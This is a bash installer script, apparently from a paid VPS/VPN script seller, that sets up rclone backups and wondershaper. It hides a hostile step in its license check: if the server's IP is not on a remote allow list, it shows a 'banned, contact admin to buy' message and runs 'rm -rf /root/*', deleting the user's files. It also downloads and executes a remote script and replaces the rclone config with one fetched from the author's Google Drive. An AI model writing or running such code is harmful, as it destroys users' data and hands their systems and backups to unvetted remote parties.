#!/bin/bash
MYIP=$(cat /usr/bin/.ipvps)
    ALLOWED_IP=$(curl -sS "https://raw.githubusercontent.com/kertasbaru/izin/main/ip" | grep "$MYIP" | awk '{print $4}')
    if [[ "$MYIP" == "$ALLOWED_IP" ]]; then
	source /usr/bin/var.conf
    else
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e "\033[41;1m ⚠️       AKSES DI TOLAK         ⚠️ \033[0m"
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
echo -e ""
echo -e "        \033[91;1m❌ SCRIPT LOCKED ❌\033[0m"
echo -e ""
echo -e "  \033[0;33m🔒 Your VPS\033[0m $ipsaya \033[0;33mHas been Banned\033[0m"
echo -e ""
echo -e "  \033[91m⚠️  Masa Aktif Sudah Habis ⚠️\033[0m"
echo -e "  \033[0;33m💡 Beli izin resmi hanya dari Admin!\033[0m"
echo -e ""
echo -e "  \033[92;1m📞 Contact Admin:\033[0m"
echo -e "  \033[96m🌍 Telegram: https://t.me/WuzzSTORE\033[0m"
echo -e "  \033[96m📱 WhatsApp: https://wa.me/6287760204418\033[0m"
echo -e ""
echo -e "\033[1;93m────────────────────────────────────────────\033[0m"
rm -rf /root/*
exit 1
	fi
wget -q ${REPO}install/limit.sh && chmod +x limit.sh && ./limit.sh
apt install rclone
printf "q\n" | rclone config
# wget -qO /root/.config/rclone/rclone.conf "https://drive.google.com/u/4/uc?id=19BP0A8pad2tc9ELmx8JcQPxNKRWP4S6M"
wget -qO /root/.config/rclone/rclone.conf "https://drive.google.com/u/4/uc?id=1Lg8L12_Wwh3IDXSPF7xESVC_xEzlk081"
git clone  https://github.com/casper9/wondershaper.git
cd wondershaper
make install
cd
rm -rf wondershaper
rm -f /root/set-br.sh
rm -f /root/limit.sh